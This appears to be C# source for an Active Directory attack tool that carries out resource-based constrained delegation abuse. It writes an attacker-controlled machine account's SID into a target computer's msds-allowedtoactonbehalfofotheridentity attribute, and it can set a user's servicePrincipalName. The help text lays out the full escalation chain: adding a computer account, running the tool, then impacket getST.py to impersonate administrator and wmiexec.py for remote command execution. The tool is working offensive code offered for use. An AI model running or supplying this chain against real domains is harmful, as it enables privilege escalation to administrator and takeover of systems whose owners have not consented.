using System;
using System.Text;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Net;
using System.DirectoryServices;
using System.Xml.Linq;

namespace SetAdProperties
{
    class Program
    {
        static void help()
        {
            Console.WriteLine("===========================   useage  ===========================");
            Console.WriteLine("Modify user's servicePrincipalName:");
            Console.WriteLine("    -dc-ip dc_ip -domain domain.com -u usernmae -p password -target target_username -spn spn_name");
            //Console.WriteLine("    -dc-ip dc_ip -domain domain.com -u usernmae -p password -target target_username -spn -clear");
            Console.WriteLine("");
            Console.WriteLine("Modify computer's msds-allowedtoactonbehalfofotheridentity:");
            Console.WriteLine("    -dc-ip dc_ip -domain domain.com -u usernmae -p password -target target_machine -mycomputer computer_name");
            Console.WriteLine("");
            Console.WriteLine("=========================== rbcd tips ===========================");
            Console.WriteLine("--1.");
            Console.WriteLine("You should add one computer first, or use a exist computer account, but you must have it's password");
            Console.WriteLine("You can add computer by impacket/examples:");
            Console.WriteLine("    py3 addcomputer.py -computer-name machine1 -computer-pass Abcd1234 -dc-ip 192.168.159.19 -method SAMR -debug test.com/jerry:Abcd1234");
            Console.WriteLine("--2.");
            Console.WriteLine("Set msds-allowedtoactonbehalfofotheridentity by this tool");
            Console.WriteLine("    SetAdProperties -dc-ip DomainController -domain DomainName -u Username -p Password -target Target -mycomputer evilComputer");
            Console.WriteLine("    SetAdProperties -dc-ip 192.168.159.19 -domain test.com -u jerry -p Abcd1234 -target SERVER12 -mycomputer machine1");
            Console.WriteLine("--3.");
            Console.WriteLine("fire the target");
            Console.WriteLine("    py3 getST.py test.com/machine1$:Abcd1234 -spn cifs/SERVER12.test.com -impersonate administrator -dc-ip 192.168.159.19");
            Console.WriteLine("    set KRB5CCNAME=administrator.ccache");
            Console.WriteLine("    py3 wmiexec.py -k test.com/administrator@SERVER12.test.com -no-pass -codec gbk");
        }
        static void Main(string[] args)
        {
            String DomainController = ""; //域控
            String Domain = "";   //域名
            String username = ""; //域用户名
            String password = ""; //域用户密码
            String targetcomputer = ""; //需要进行提权的机器
            String mymachineAccount = ""; //恶意机器账号
            String spntargetuser = "";
            String spnname = "";

            if (args.Length != 12)
            {
                help();
                return;
            }
            int i = 0;
            for (; i < args.Length; i++)
            {
                if (args[i].ToLower() == "-dc-ip")
                {
                    DomainController = args[++i];
                }
                if (args[i].ToLower() == "-domain")
                {
                    Domain = args[++i];
                }
                if (args[i].ToLower() == "-u")
                {
                    username = args[++i];
                }
                if (args[i].ToLower() == "-p")
                {
                    password = args[++i];
                }
                if (args[i].ToLower() == "-target")
                {
                    targetcomputer = args[++i];
                    spntargetuser = targetcomputer;
                }
                if (args[i].ToLower() == "-mycomputer")
                {
                    mymachineAccount = args[++i];
                }
                if (args[i].ToLower() == "-spn")
                {
                    spnname = args[++i];
                }
            }
               
            if (spnname != "")
            {
                //设置spn
                Simulation.Run(Domain, username, password, () =>
                {
                    //获取已经添加的机器的sid
                    DirectorySearcher searcher = Ldapcoon.getSearch(Domain, DomainController, false, false);
                    SearchResultCollection result = Ldapcoon.LdapSearchAll("(&(objectClass=user)(|(name=" + spntargetuser + ")))");
                    if (result.Count != 1)
                    {
                        Console.WriteLine("获取到的结果个数不为1, Count=" + result.Count);
                        return;
                    }
                    SecurityIdentifier sido = new SecurityIdentifier(result[0].Properties["objectsid"][0] as byte[], 0);
                    string sid = sido.Value.ToString();

                    //找到需要提权的计算机，设置约束委派
                    string Filter = "(CN=" + targetcomputer + ")";
                    SearchResult searchResult = Ldapcoon.LdapSearchOne(Filter);
                    DirectoryEntry directoryEntry = searchResult.GetDirectoryEntry();
                    if (result != null)
                    {
                        if (spnname == "-clear")
                        {
                            //todo
                        }
                        else
                        {
                            directoryEntry.Properties["servicePrincipalName"].Value = spnname;
                        }
                        
                        try
                        {
                            //提交更改
                            directoryEntry.CommitChanges();
                            Console.WriteLine("[+] successfully!");
                        }
                        catch (System.Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                            Console.WriteLine("[!] \nFailed...");
                            return;
                        }
                    }
                });
            }

            if (mymachineAccount != "")
            {
                //设置约束委派
                Simulation.Run(Domain, username, password, () =>
                {
                    //获取已经添加的机器的sid
                    DirectorySearcher searcher = Ldapcoon.getSearch(Domain, DomainController, false, false);
                    SearchResultCollection result = Ldapcoon.LdapSearchAll("(&(samAccountType=805306369)(|(name=" + mymachineAccount + ")))");
                    if (result.Count != 1)
                    {
                        Console.WriteLine("获取到的结果个数不为1, Count=" + result.Count);
                        return;
                    }
                    SecurityIdentifier sido = new SecurityIdentifier(result[0].Properties["objectsid"][0] as byte[], 0);
                    string sid = sido.Value.ToString();

                    //找到需要提权的计算机，设置约束委派
                    string Filter = "(CN=" + targetcomputer + ")";
                    SearchResult searchResult = Ldapcoon.LdapSearchOne(Filter);
                    DirectoryEntry directoryEntry = searchResult.GetDirectoryEntry();
                    if (result != null)
                    {
                        String sec_descriptor = "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + sid + ")";
                        System.Security.AccessControl.RawSecurityDescriptor sd = new RawSecurityDescriptor(sec_descriptor);
                        byte[] descriptor_buffer = new byte[sd.BinaryLength];
                        sd.GetBinaryForm(descriptor_buffer, 0);
                        // 添加evilpc的sid到msds-allowedtoactonbehalfofotheridentity中
                        directoryEntry.Properties["msds-allowedtoactonbehalfofotheridentity"].Value = descriptor_buffer;
                        try
                        {
                            //提交更改
                            directoryEntry.CommitChanges();
                            Console.WriteLine("[+] successfully!");
                        }
                        catch (System.Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                            Console.WriteLine("[!] \nFailed...");
                            return;
                        }
                    }
                });
            }            

        }
    }
}